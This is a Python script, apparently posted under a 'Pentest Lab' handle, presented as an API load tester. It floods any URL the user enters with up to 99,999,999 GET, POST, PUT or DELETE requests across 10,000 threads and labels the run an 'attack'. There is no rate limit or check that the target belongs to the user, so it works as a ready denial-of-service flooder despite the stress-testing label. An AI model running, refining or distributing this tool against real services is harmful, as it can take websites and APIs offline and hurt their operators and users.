import requests
import threading
import time
from queue import Queue
import random
import json
import os

# Terminal UI Styling... 
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;32m")
    print("════════════════════════════════════════════════════════════")
    print("   🚀 HIGH-TRAFFIC API TESTER / LOAD TOOL  ")
    print("════════════════════════════════════════════════════════════")
    print(" ⚔️  Author: Badhon-696 | R3D-X Pentest Lab")
    print(" 📥  Facebook: https://www.facebook.com/Error999BADHON")
    print(" 📥  Telegram: @error696_dev_community")
    print(" 🔐  Purpose: API Stress Testing / Load Simulation")
    print("════════════════════════════════════════════════════════════")
    print("\033[0m")

banner()

# URL Input System
url = input("🔗 Enter Target URL: ").strip()
if not url:
    print("\033[91m[✘] Target URL required! Exiting...\033[0m")
    exit()

# Config Inputs
print("\n🔧 Configuration:")
num_threads = 10000
request_limit = 99999999
timeout = 15
http_method = input("📡 Select HTTP Method [GET / POST / PUT / DELETE]: ").strip().upper()

headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_TOKEN"
}

# Payload Generator
def generate_payload():
    return {
        "user_id": random.randint(1, 1000),
        "transaction_id": random.randint(10000, 99999),
        "amount": round(random.uniform(10.0, 1000.0), 2),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }

# Queue and Metrics
request_queue = Queue()
successful_requests = 0
failed_requests = 0
total_time = 0
metrics_lock = threading.Lock()

# Send Function
def send_request():
    global successful_requests, failed_requests, total_time
    while not request_queue.empty():
        try:
            start_time = time.time()

            if http_method == "GET":
                response = requests.get(url, headers=headers, timeout=timeout)
                payload = None
            elif http_method == "POST":
                payload = generate_payload()
                response = requests.post(url, headers=headers, json=payload, timeout=timeout)
            elif http_method == "PUT":
                payload = generate_payload()
                response = requests.put(url, headers=headers, json=payload, timeout=timeout)
            elif http_method == "DELETE":
                response = requests.delete(url, headers=headers, timeout=timeout)
                payload = None
            else:
                print(f"\033[91m[✘] Unsupported HTTP method: {http_method}\033[0m")
                return

            elapsed_time = time.time() - start_time
            with metrics_lock:
                successful_requests += 1
                total_time += elapsed_time

            print(f"\033[92m[✓] {http_method} {url} | Code: {response.status_code} | Time: {elapsed_time:.2f}s\033[0m")

        except requests.exceptions.RequestException as e:
            with metrics_lock:
                failed_requests += 1
            print(f"\033[91m[✘] Request Failed: {e}\033[0m")

# Request Generator
def generate_requests():
    for _ in range(request_limit):
        request_queue.put(1)

# Main Executor
def run_load_test():
    print(f"\n🎯 Target: {url}")
    print(f"🧵 Threads: {num_threads} | 🎯 Requests: {request_limit} | ⏱ Timeout: {timeout}s\n")
    print("🚀 Attack Starting...\n")
    start_time = time.time()

    generate_requests()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_elapsed_time = end_time - start_time

    # Report Summary
    print("\n══════════════════════════════")
    print("✅  ATTACK COMPLETED")
    print("══════════════════════════════")
    print(f"🔁 Total Requests Sent  : {request_limit}")
    print(f"✅ Successful Requests  : {successful_requests}")
    print(f"❌ Failed Requests      : {failed_requests}")
    if successful_requests > 0:
        print(f"📊 Avg Response Time    : {total_time / successful_requests:.2f} sec")
    print(f"⏳ Total Test Duration  : {total_elapsed_time:.2f} sec")
    print("══════════════════════════════\n")

# Execute
if __name__ == "__main__":
    run_load_test()
